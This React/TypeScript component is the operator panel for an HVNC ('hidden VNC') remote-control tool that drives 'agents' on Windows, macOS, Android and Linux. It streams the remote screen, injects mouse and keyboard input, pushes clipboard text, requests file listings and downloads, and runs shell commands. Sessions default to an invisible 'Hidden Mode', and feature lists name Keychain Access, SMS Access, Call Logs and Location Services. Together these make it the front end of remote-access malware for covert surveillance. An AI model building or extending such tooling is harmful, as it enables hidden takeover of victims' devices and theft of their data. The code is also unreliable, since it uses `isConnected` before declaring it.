import React, { useState, useEffect, useRef, useMemo } from 'react';
import { FiMonitor, FiMousePointer, FiType, FiClipboard, FiDownload, FiCamera, FiVideo, FiSettings, FiRefreshCw, FiMaximize, FiMinimize, FiSmartphone, FiWifi, FiHardDrive, FiTerminal, FiFolder } from 'react-icons/fi';
import { SiWindows, SiApple, SiAndroid, SiLinux } from 'react-icons/si';
import { useNotification } from '../contexts/NotificationContext';
import { useHvnc } from '../contexts/HvncContext';
import { HvncSessionOptions } from '../services/hvncService';

interface HvncControlProps {
  agentId: string;
  platform: string;
  onClose: () => void;
}

interface PlatformCapabilities {
  hasDesktop: boolean;
  hasFileSystem: boolean;
  hasShell: boolean;
  hasScreenCapture: boolean;
  hasRemoteInput: boolean;
  hasProcessManagement: boolean;
  hasNetworkAccess: boolean;
  specialFeatures: string[];
}

const HvncControl: React.FC<HvncControlProps> = ({ agentId, platform, onClose }) => {
  const { addNotification } = useNotification();
  const { getSession, startSession, stopSession, sendCommand } = useHvnc();
  const session = getSession(agentId);
  const [quality, setQuality] = useState(session.quality || 'medium');
  const [fps, setFps] = useState(String(session.fps || 15));
  const [mode, setMode] = useState(session.mode || 'hidden');
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [activeFeature, setActiveFeature] = useState<string>('desktop');
  const [mouseControlEnabled, setMouseControlEnabled] = useState(true);
  const [keyboardControlEnabled, setKeyboardControlEnabled] = useState(true);
  const hvncScreenRef = useRef<HTMLDivElement>(null);
  const initialPath = platform.toLowerCase() === 'windows' ? 'C:\\' : '/';
  const [fileBrowserPath, setFileBrowserPath] = useState(initialPath);
  const [fileActionLog, setFileActionLog] = useState<string[]>([]);
  const [shellInput, setShellInput] = useState('');
  const [shellHistory, setShellHistory] = useState<string[]>([]);

  // Platform-specific capabilities
  const getPlatformCapabilities = (platform: string): PlatformCapabilities => {
    switch (platform.toLowerCase()) {
      case 'windows':
        return {
          hasDesktop: true,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: true,
          hasRemoteInput: true,
          hasProcessManagement: true,
          hasNetworkAccess: true,
          specialFeatures: ['Registry Editor', 'Service Manager', 'Event Viewer', 'Task Manager']
        };
      case 'mac':
      case 'macos':
        return {
          hasDesktop: true,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: true,
          hasRemoteInput: true,
          hasProcessManagement: true,
          hasNetworkAccess: true,
          specialFeatures: ['Activity Monitor', 'System Preferences', 'Keychain Access', 'Console']
        };
      case 'android':
        return {
          hasDesktop: false,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: true,
          hasRemoteInput: true,
          hasProcessManagement: false,
          hasNetworkAccess: true,
          specialFeatures: ['App Manager', 'Device Info', 'SMS Access', 'Call Logs', 'Location Services']
        };
      case 'linux':
        return {
          hasDesktop: true,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: true,
          hasRemoteInput: true,
          hasProcessManagement: true,
          hasNetworkAccess: true,
          specialFeatures: ['System Monitor', 'Package Manager', 'Service Control', 'Log Viewer']
        };
      default:
        return {
          hasDesktop: false,
          hasFileSystem: true,
          hasShell: true,
          hasScreenCapture: false,
          hasRemoteInput: false,
          hasProcessManagement: false,
          hasNetworkAccess: true,
          specialFeatures: []
        };
    }
  };

    const capabilities = getPlatformCapabilities(platform);

    // Get platform icon
    const getPlatformIcon = (platform: string) => {
    switch (platform.toLowerCase()) {
      case 'windows':
        return <SiWindows className="w-5 h-5" />;
      case 'mac':
      case 'macos':
        return <SiApple className="w-5 h-5" />;
      case 'android':
        return <SiAndroid className="w-5 h-5" />;
      case 'linux':
        return <SiLinux className="w-5 h-5" />;
      default:
        return <FiMonitor className="w-5 h-5" />;
    }
  };

    const canvasRef = useRef<HTMLCanvasElement>(null);
    useEffect(() => {
      setFileBrowserPath(platform.toLowerCase() === 'windows' ? 'C:\\' : '/');
    }, [platform]);

    useEffect(() => {
      if (isConnected && canvasRef.current) {
        canvasRef.current.focus({ preventScroll: true });
      }
    }, [isConnected]);
    const ensureSessionActive = () => {
      if (!session.sessionId || !isConnected) {
        addNotification('warning', 'Start a remote session before sending controls');
        return false;
      }
      return true;
    };


    const getRemoteCoordinates = (event: React.MouseEvent<HTMLCanvasElement, MouseEvent>) => {
      const canvas = canvasRef.current;
      if (!canvas) {
        return { x: 0, y: 0 };
      }

      const rect = canvas.getBoundingClientRect();
      const frameWidth = session.lastFrame?.frameInfo?.width || canvas.width || rect.width;
      const frameHeight = session.lastFrame?.frameInfo?.height || canvas.height || rect.height;

      const scaleX = frameWidth / rect.width;
      const scaleY = frameHeight / rect.height;

      return {
        x: Math.max(0, Math.min(frameWidth, (event.clientX - rect.left) * scaleX)),
        y: Math.max(0, Math.min(frameHeight, (event.clientY - rect.top) * scaleY)),
      };
    };

    const sendMouseCommand = (
      action: string,
      event: React.MouseEvent<HTMLCanvasElement, MouseEvent> | React.WheelEvent<HTMLCanvasElement>
    ) => {
      if (!mouseControlEnabled || !session.sessionId || !isConnected) {
        return;
      }

      const coords =
        'clientX' in event && 'clientY' in event ? getRemoteCoordinates(event as React.MouseEvent<HTMLCanvasElement>) : null;

      sendCommand(agentId, {
        type: 'mouse',
        action,
        data: {
          x: coords?.x,
          y: coords?.y,
          button: 'button' in event ? event.button : undefined,
          buttons: 'buttons' in event ? event.buttons : undefined,
          deltaX: 'deltaX' in event ? event.deltaX : undefined,
          deltaY: 'deltaY' in event ? event.deltaY : undefined,
          deltaMode: 'deltaMode' in event ? event.deltaMode : undefined,
          modifiers: {
            altKey: event.altKey,
            ctrlKey: event.ctrlKey,
            metaKey: event.metaKey,
            shiftKey: event.shiftKey,
          },
        },
      });
    };

    const sendKeyboardCommand = (action: string, event: React.KeyboardEvent<HTMLCanvasElement>) => {
      if (!keyboardControlEnabled || !session.sessionId || !isConnected) {
        return;
      }

      sendCommand(agentId, {
        type: 'keyboard',
        action,
        data: {
          key: event.key,
          code: event.code,
          keyCode: event.keyCode,
          repeat: event.repeat,
          modifiers: {
            altKey: event.altKey,
            ctrlKey: event.ctrlKey,
            metaKey: event.metaKey,
            shiftKey: event.shiftKey,
          },
        },
      });
    };

    const handleClipboardSend = () => {
      if (!session.sessionId || !isConnected) {
        addNotification('warning', 'Connect to a session before using clipboard sync');
        return;
      }

      const text = prompt('Enter text to send to the remote clipboard:');
      if (!text) {
        return;
      }

      sendCommand(agentId, {
        type: 'clipboard',
        action: 'push',
        data: { text },
      });
      addNotification('success', 'Clipboard text sent to remote session');
    };

    const handleFileCommand = (action: 'list' | 'download') => {
      if (!ensureSessionActive()) {
        return;
      }

      const payloadAction = action === 'list' ? 'file_list' : 'file_download';
      sendCommand(agentId, {
        type: 'control',
        action: payloadAction,
        data: {
          path: fileBrowserPath,
        },
      });

      const message =
        action === 'list'
          ? `Requested directory listing for ${fileBrowserPath}`
          : `Requested download for ${fileBrowserPath}`;

      setFileActionLog((prev) => [message, ...prev].slice(0, 10));
      addNotification('info', message);
    };

    const handleShellExecute = () => {
      if (!shellInput.trim()) {
        return;
      }

      if (!ensureSessionActive()) {
        return;
      }

      const command = shellInput.trim();
      sendCommand(agentId, {
        type: 'control',
        action: 'shell_execute',
        data: {
          command,
        },
      });

      setShellHistory((prev) => [`> ${command}`, ...prev].slice(0, 20));
      setShellInput('');
      addNotification('info', `Sent shell command: ${command}`);
    };

    const clearShellHistory = () => {
      setShellHistory([]);
    };

    const derivedStatus = useMemo(() => {
      if (session.lastError) {
        return `Error: ${session.lastError}`;
      }

      switch (session.status) {
        case 'connecting':
          return 'Connecting...';
        case 'starting':
          return 'Starting session...';
        case 'connected':
          return 'Connected';
        case 'disconnected':
          return 'Disconnected';
        case 'error':
          return 'Error';
        default:
          return 'Disconnected';
      }
    }, [session.status, session.lastError]);

    const isConnected = session.status === 'connected';
    const isLoading = session.isLoading;

    useEffect(() => {
      setQuality(session.quality || 'medium');
    }, [session.quality]);

    useEffect(() => {
      setFps(String(session.fps || 15));
    }, [session.fps]);

    useEffect(() => {
      setMode(session.mode || 'hidden');
    }, [session.mode]);

    useEffect(() => {
      if (!session.lastFrame || !canvasRef.current) {
        return;
      }

      const { frameData, frameInfo } = session.lastFrame;
      const canvas = canvasRef.current;
      const ctx = canvas.getContext('2d');

      if (!ctx) return;

      const drawImage = (img: HTMLImageElement) => {
        const width = frameInfo?.width || img.width;
        const height = frameInfo?.height || img.height;
        canvas.width = width;
        canvas.height = height;
        ctx.clearRect(0, 0, width, height);
        ctx.drawImage(img, 0, 0, width, height);
      };

      if (frameData.startsWith('data:image')) {
        const img = new Image();
        img.onload = () => drawImage(img);
        img.src = frameData;
        return;
      }

      if (frameData.includes('<svg')) {
        try {
          const svgBlob = new Blob([frameData], { type: 'image/svg+xml' });
          const url = URL.createObjectURL(svgBlob);
          const img = new Image();
          img.onload = () => {
            drawImage(img);
            URL.revokeObjectURL(url);
          };
          img.src = url;
          return;
        } catch (error) {
          console.error('Failed to render SVG frame:', error);
        }
      }

      const img = new Image();
      img.onload = () => drawImage(img);
      img.src = `data:image/jpeg;base64,${frameData}`;
    }, [session.lastFrame]);

    // Connect to HVNC session
    const connectHvnc = async () => {
      try {
        const options: HvncSessionOptions = {
          quality,
          mode,
          fps: parseInt(fps, 10) || 15,
        };

        addNotification('info', `Connecting to remote session for agent ${agentId}...`);
        const response = await startSession(agentId, options);
        if (response.status === 'success') {
          addNotification('success', 'Successfully connected to remote session');
        }
      } catch (error: any) {
        console.error('Failed to connect to HVNC session:', error);
        addNotification('error', `Failed to connect to remote session: ${error?.message || 'Unknown error'}`);
      }
    };

    // Disconnect from HVNC session
    const disconnectHvnc = async () => {
      try {
        addNotification('info', `Disconnecting from remote session...`);
        await stopSession(agentId);
        addNotification('success', `Successfully disconnected from remote session`);
      } catch (error: any) {
        console.error('Failed to disconnect from HVNC session:', error);
        addNotification('error', `Failed to disconnect from remote session: ${error?.message || 'Unknown error'}`);
      }
    };

    // Take screenshot
    const takeScreenshot = () => {
      if (!isConnected || !canvasRef.current) return;

      const canvas = canvasRef.current;
      canvas.toBlob((blob) => {
        if (!blob) return;

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `hvnc-${agentId}-${timestamp}.png`;
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = filename;
        link.click();
        URL.revokeObjectURL(link.href);
        addNotification('success', 'Screenshot downloaded');
      }, 'image/png');
    };

    // Toggle fullscreen
  const toggleFullscreen = () => {
    if (!hvncScreenRef.current) return;
    
    if (!isFullscreen) {
      if (hvncScreenRef.current.requestFullscreen) {
        hvncScreenRef.current.requestFullscreen();
      }
    } else {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      }
    }
    
    setIsFullscreen(!isFullscreen);
  };

    // Clean up on unmount
    useEffect(() => {
      return () => {
        if (session.isActive) {
          stopSession(agentId).catch((err) => {
            console.error('Failed to stop HVNC session on unmount:', err);
          });
        }
      };
    }, [agentId, session.isActive, stopSession]);

  return (
    <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm p-6">
      <div className="flex justify-between items-center mb-4">
        <div className="flex items-center">
          {getPlatformIcon(platform)}
          <h3 className="text-xl font-semibold ml-2">
            {platform.charAt(0).toUpperCase() + platform.slice(1)} Remote Control
          </h3>
        </div>
        <div className="flex items-center">
            <span className={`inline-block w-3 h-3 rounded-full mr-2 ${isConnected ? 'bg-success' : session.lastError ? 'bg-danger' : 'bg-warning'}`}></span>
            <span>{derivedStatus}</span>
        </div>
      </div>

      {/* Platform Capabilities Overview */}
      <div className="mb-4 p-3 bg-gray-50 dark:bg-boxdark-2 rounded-lg">
        <h4 className="text-sm font-medium mb-2">Platform Capabilities</h4>
        <div className="flex flex-wrap gap-2">
          {capabilities.hasDesktop && (
            <span className="px-2 py-1 bg-success/10 text-success text-xs rounded">Desktop Access</span>
          )}
          {capabilities.hasFileSystem && (
            <span className="px-2 py-1 bg-primary/10 text-primary text-xs rounded">File System</span>
          )}
          {capabilities.hasShell && (
            <span className="px-2 py-1 bg-warning/10 text-warning text-xs rounded">Shell Access</span>
          )}
          {capabilities.hasScreenCapture && (
            <span className="px-2 py-1 bg-info/10 text-info text-xs rounded">Screen Capture</span>
          )}
          {capabilities.hasRemoteInput && (
            <span className="px-2 py-1 bg-secondary/10 text-secondary text-xs rounded">Remote Input</span>
          )}
        </div>
      </div>

      {/* Feature Tabs */}
      <div className="mb-4">
        <div className="flex border-b border-stroke dark:border-strokedark">
          {capabilities.hasDesktop && (
            <button
              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
                activeFeature === 'desktop'
                  ? 'border-primary text-primary'
                  : 'border-transparent text-bodydark2 hover:text-bodydark'
              }`}
              onClick={() => setActiveFeature('desktop')}
            >
              <FiMonitor className="w-4 h-4 inline mr-1" />
              Desktop
            </button>
          )}
          {capabilities.hasFileSystem && (
            <button
              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
                activeFeature === 'files'
                  ? 'border-primary text-primary'
                  : 'border-transparent text-bodydark2 hover:text-bodydark'
              }`}
              onClick={() => setActiveFeature('files')}
            >
              <FiFolder className="w-4 h-4 inline mr-1" />
              Files
            </button>
          )}
          {capabilities.hasShell && (
            <button
              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
                activeFeature === 'shell'
                  ? 'border-primary text-primary'
                  : 'border-transparent text-bodydark2 hover:text-bodydark'
              }`}
              onClick={() => setActiveFeature('shell')}
            >
              <FiTerminal className="w-4 h-4 inline mr-1" />
              Shell
            </button>
          )}
          {capabilities.specialFeatures.length > 0 && (
            <button
              className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
                activeFeature === 'special'
                  ? 'border-primary text-primary'
                  : 'border-transparent text-bodydark2 hover:text-bodydark'
              }`}
              onClick={() => setActiveFeature('special')}
            >
              <FiSettings className="w-4 h-4 inline mr-1" />
              Special
            </button>
          )}
        </div>
      </div>
      
      {isConnected ? (
        <div>
          {/* Desktop View */}
          {activeFeature === 'desktop' && capabilities.hasDesktop && (
            <div>
              <div 
                ref={hvncScreenRef}
                className="bg-boxdark rounded-lg p-2 mb-4"
              >
                <div className="aspect-video bg-black relative flex items-center justify-center">
                  <canvas 
                    ref={canvasRef}
                      className="max-w-full max-h-full border border-gray-600 rounded focus:outline-none"
                    style={{ cursor: 'crosshair' }}
                      tabIndex={0}
                      onMouseDown={(event) => {
                        event.preventDefault();
                        sendMouseCommand('down', event);
                      }}
                      onMouseUp={(event) => {
                        event.preventDefault();
                        sendMouseCommand('up', event);
                      }}
                      onMouseMove={(event) => {
                        if (mouseControlEnabled && isConnected) {
                          sendMouseCommand('move', event);
                        }
                      }}
                      onWheel={(event) => {
                        event.preventDefault();
                        sendMouseCommand('wheel', event);
                      }}
                      onContextMenu={(event) => {
                        event.preventDefault();
                        sendMouseCommand('context', event);
                      }}
                      onKeyDown={(event) => {
                        event.preventDefault();
                        sendKeyboardCommand('down', event);
                      }}
                      onKeyUp={(event) => {
                        event.preventDefault();
                        sendKeyboardCommand('up', event);
                      }}
                    />
                    {!isConnected && (
                      <div className="absolute inset-0 flex items-center justify-center">
                        <div className="text-center">
                          {getPlatformIcon(platform)}
                          <p className="text-bodydark2 mt-2">
                            {platform === 'windows' && 'Windows Remote Desktop Session'}
                            {platform === 'mac' && 'macOS Remote Session'}
                            {platform === 'android' && 'Android Screen Mirror'}
                            {platform === 'linux' && 'Linux Desktop Session'}
                            {!['windows', 'mac', 'android', 'linux'].includes(platform.toLowerCase()) && 'Remote Session'}
                          </p>
                          <p className="text-xs text-bodydark2 mt-2">Status: {derivedStatus}</p>
                          {session.lastError && (
                            <p className="text-xs text-danger mt-1">Error: {session.lastError}</p>
                          )}
                        </div>
                      </div>
                    )}
                </div>
              </div>
              
              {/* Desktop Controls */}
              <div className="flex flex-wrap gap-2 mb-4">
                  {capabilities.hasRemoteInput && (
                    <>
                      <button
                        className={`py-2 px-3 rounded transition-colors flex items-center ${
                          mouseControlEnabled
                            ? 'bg-primary/10 text-primary hover:bg-primary/20'
                            : 'bg-gray-200 text-bodydark hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-300'
                        }`}
                        onClick={() => setMouseControlEnabled((prev) => !prev)}
                      >
                        <FiMousePointer className="w-4 h-4 mr-1" />
                        <span>{mouseControlEnabled ? 'Mouse Enabled' : 'Enable Mouse'}</span>
                      </button>
                      <button
                        className={`py-2 px-3 rounded transition-colors flex items-center ${
                          keyboardControlEnabled
                            ? 'bg-primary/10 text-primary hover:bg-primary/20'
                            : 'bg-gray-200 text-bodydark hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-300'
                        }`}
                        onClick={() => setKeyboardControlEnabled((prev) => !prev)}
                      >
                        <FiType className="w-4 h-4 mr-1" />
                        <span>{keyboardControlEnabled ? 'Keyboard Enabled' : 'Enable Keyboard'}</span>
                      </button>
                    </>
                  )}
                  <button
                    className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center"
                    onClick={handleClipboardSend}
                  >
                    <FiClipboard className="w-4 h-4 mr-1" />
                    <span>Clipboard</span>
                  </button>
                {capabilities.hasScreenCapture && (
                  <>
                    <button 
                      className="py-2 px-3 bg-warning/10 text-warning rounded hover:bg-warning/20 transition-colors flex items-center"
                      onClick={takeScreenshot}
                    >
                      <FiCamera className="w-4 h-4 mr-1" />
                      <span>Screenshot</span>
                    </button>
                    <button className="py-2 px-3 bg-success/10 text-success rounded hover:bg-success/20 transition-colors flex items-center">
                      <FiVideo className="w-4 h-4 mr-1" />
                      <span>Record</span>
                    </button>
                  </>
                )}
                <button 
                  className="py-2 px-3 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors flex items-center"
                  onClick={toggleFullscreen}
                >
                  {isFullscreen ? (
                    <>
                      <FiMinimize className="w-4 h-4 mr-1" />
                      <span>Exit Fullscreen</span>
                    </>
                  ) : (
                    <>
                      <FiMaximize className="w-4 h-4 mr-1" />
                      <span>Fullscreen</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          )}

          {/* File System View */}
          {activeFeature === 'files' && capabilities.hasFileSystem && (
            <div className="bg-gray-50 dark:bg-boxdark-2 rounded-lg p-4">
                <div className="flex flex-col gap-4">
                  <div className="flex items-center justify-between">
                    <h4 className="font-medium">File System Browser</h4>
                    <div className="flex gap-2">
                      <button
                        className="py-1 px-3 bg-primary/10 text-primary rounded text-sm hover:bg-primary/20 transition-colors flex items-center"
                        onClick={() => handleFileCommand('list')}
                      >
                        <FiRefreshCw className="w-4 h-4 inline mr-1" />
                        List
                      </button>
                      <button
                        className="py-1 px-3 bg-primary/10 text-primary rounded text-sm hover:bg-primary/20 transition-colors flex items-center"
                        onClick={() => handleFileCommand('download')}
                      >
                        <FiDownload className="w-4 h-4 inline mr-1" />
                        Request Download
                      </button>
                      <button
                        className="py-1 px-3 bg-success/10 text-success rounded text-sm hover:bg-success/20 transition-colors flex items-center"
                        onClick={() => addNotification('info', 'Remote upload scheduling coming soon')}
                      >
                        Upload
                      </button>
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs text-bodydark2 mb-1 uppercase tracking-wide">Path</label>
                    <input
                      type="text"
                      value={fileBrowserPath}
                      onChange={(event) => setFileBrowserPath(event.target.value)}
                      className="w-full bg-white dark:bg-boxdark border border-stroke dark:border-strokedark rounded px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
                    />
                  </div>

                  <div className="bg-white dark:bg-boxdark rounded-lg border border-stroke dark:border-strokedark p-4 text-sm text-bodydark2 max-h-48 overflow-y-auto">
                    {fileActionLog.length > 0 ? (
                      <ul className="space-y-2">
                        {fileActionLog.map((entry, index) => (
                          <li key={`${entry}-${index}`} className="flex items-center gap-2">
                            <FiFolder className="w-4 h-4 text-primary" />
                            <span>{entry}</span>
                          </li>
                        ))}
                      </ul>
                    ) : (
                      <div className="text-center py-6">
                        <FiFolder className="w-10 h-10 mx-auto mb-2 opacity-60" />
                        <p>No actions yet. Choose a directory and click “List”.</p>
                      </div>
                    )}
                  </div>
                </div>
            </div>
          )}

          {/* Shell View */}
          {activeFeature === 'shell' && capabilities.hasShell && (
            <div className="bg-black rounded-lg p-4">
              <div className="flex items-center justify-between mb-4">
                <h4 className="font-medium text-white">Shell Terminal</h4>
                  <button
                    className="py-1 px-3 bg-primary/10 text-primary rounded text-sm hover:bg-primary/20 transition-colors"
                    onClick={clearShellHistory}
                  >
                  Clear
                </button>
              </div>

                <div className="bg-black text-green-400 font-mono text-sm p-4 rounded border border-gray-700 min-h-[200px] max-h-[260px] overflow-y-auto space-y-2">
                  {shellHistory.length > 0 ? (
                    shellHistory.map((entry, index) => (
                      <div key={`${entry}-${index}`} className="whitespace-pre-wrap">
                        {entry}
                      </div>
                    ))
                  ) : (
                    <div className="text-center py-8 text-gray-500">
                      <FiTerminal className="w-12 h-12 mx-auto mb-2" />
                      <p>Type a command below to execute it on the remote endpoint.</p>
                    </div>
                  )}
              </div>

                <div className="flex flex-col md:flex-row md:items-center gap-3 mt-4">
                  <input
                    type="text"
                    value={shellInput}
                    onChange={(event) => setShellInput(event.target.value)}
                    onKeyDown={(event) => {
                      if (event.key === 'Enter') {
                        event.preventDefault();
                        handleShellExecute();
                      }
                    }}
                    placeholder="e.g. whoami, dir, ls -la"
                    className="flex-1 bg-white dark:bg-boxdark border border-stroke dark:border-strokedark rounded px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
                  />
                  <button
                    onClick={handleShellExecute}
                    className="px-4 py-2 bg-primary text-white rounded hover:bg-primary/90 transition-colors flex items-center justify-center gap-2"
                  >
                    <FiTerminal className="w-4 h-4" />
                    Execute
                  </button>
                </div>
            </div>
          )}

          {/* Special Features View */}
          {activeFeature === 'special' && capabilities.specialFeatures.length > 0 && (
            <div className="bg-gray-50 dark:bg-boxdark-2 rounded-lg p-4">
              <h4 className="font-medium mb-4">Platform-Specific Features</h4>
              <div className="grid grid-cols-2 gap-3">
                {capabilities.specialFeatures.map((feature, index) => (
                  <button
                    key={index}
                    className="p-3 bg-white dark:bg-boxdark rounded-lg border border-stroke dark:border-strokedark hover:bg-primary/5 transition-colors text-left"
                  >
                    <div className="flex items-center">
                      <FiSettings className="w-5 h-5 mr-2 text-primary" />
                      <span className="font-medium">{feature}</span>
                    </div>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Connection Controls */}
          <div className="flex justify-between items-center mt-4 pt-4 border-t border-stroke dark:border-strokedark">
            <div className="flex items-center gap-4">
              <div className="flex items-center">
                <span className="text-sm text-bodydark2 mr-2">Quality:</span>
                <select 
                  className="bg-bodydark2/10 border border-stroke rounded p-1 text-sm"
                  value={quality}
                  onChange={(e) => setQuality(e.target.value)}
                >
                  <option value="high">High</option>
                  <option value="medium">Medium</option>
                  <option value="low">Low</option>
                </select>
              </div>
              {capabilities.hasDesktop && (
                <div className="flex items-center">
                  <span className="text-sm text-bodydark2 mr-2">FPS:</span>
                  <select 
                    className="bg-bodydark2/10 border border-stroke rounded p-1 text-sm"
                    value={fps}
                    onChange={(e) => setFps(e.target.value)}
                  >
                    <option value="30">30</option>
                    <option value="15">15</option>
                    <option value="5">5</option>
                  </select>
                </div>
              )}
              <button className="p-2 bg-primary/10 text-primary rounded hover:bg-primary/20 transition-colors">
                <FiRefreshCw className="w-4 h-4" />
              </button>
            </div>
            
            <button 
              className="py-2 px-4 bg-danger text-white rounded-lg hover:bg-danger/90 transition-colors"
              onClick={disconnectHvnc}
            >
              Disconnect
            </button>
          </div>
        </div>
      ) : (
        <div className="text-center py-8">
          <FiMonitor className="w-16 h-16 mx-auto mb-4 text-bodydark2" />
          <p className="mb-4">Start a remote HVNC session to control this agent</p>
          <div className="space-y-3 max-w-sm mx-auto">
              <div>
                <label className="block text-sm text-bodydark2 mb-1">Connection Mode</label>
                <select 
                  className="w-full bg-bodydark2/10 border border-stroke rounded p-2"
                  value={mode}
                  onChange={(e) => setMode(e.target.value)}
                >
                  <option value="hidden">Hidden Mode (Invisible)</option>
                  <option value="visible">Visible Mode (User can see)</option>
                  <option value="shared">Shared Mode (Collaborative)</option>
                </select>
              </div>
              <div>
                <label className="block text-sm text-bodydark2 mb-1">Quality Settings</label>
                <select 
                  className="w-full bg-bodydark2/10 border border-stroke rounded p-2"
                  value={quality}
                  onChange={(e) => setQuality(e.target.value)}
                >
                  <option value="high">High Quality (More Bandwidth)</option>
                  <option value="medium">Medium Quality (Balanced)</option>
                  <option value="low">Low Quality (Less Bandwidth)</option>
                </select>
              </div>
            <button 
              className="w-full py-2 px-4 bg-primary text-white rounded-lg"
              onClick={connectHvnc}
              disabled={isLoading}
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                  Connecting...
                </div>
              ) : (
                'Connect'
              )}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default HvncControl;